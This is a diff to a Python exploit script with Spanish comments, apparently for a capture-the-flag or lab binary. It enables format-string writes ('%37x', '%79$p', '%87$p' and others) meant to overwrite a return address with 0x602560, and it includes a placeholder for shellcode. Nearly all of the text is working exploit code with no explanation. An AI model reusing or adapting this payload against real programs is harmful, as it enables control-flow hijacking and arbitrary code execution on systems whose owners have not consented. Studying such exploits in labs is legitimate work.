@@ -120,12 +120,12 @@ def main():
 
     # en ret_addr sobreescribo 0x40140a por 0x602560
     payload  = ''
-    #payload += '%37x' # 0x25
+    payload += '%37x' # 0x25
     payload += '%79$p' # byte del medio
-    #payload += '%59x' # 0x60
-    #payload += '%87$p' # MSF
-    #payload += '%50x'  # 50 porque si
-    #payload += '%85$p' # LSB
+    payload += '%59x' # 0x60
+    payload += '%87$p' # MSF
+    payload += '%50x'  # 50 porque si
+    payload += '%85$p' # LSB
     pad = len(payload) % 8
     if pad > 0:
         payload += ' ' * (8 - pad)
@@ -139,9 +139,6 @@ def main():
 
     #payload += shellcode
     payload += 'Z' * len(shellcode)
-    pad = len(payload) % 8
-    if pad > 0:
-        payload += ' ' * (8 - pad)
 
     print run(payload)
     #interactive()
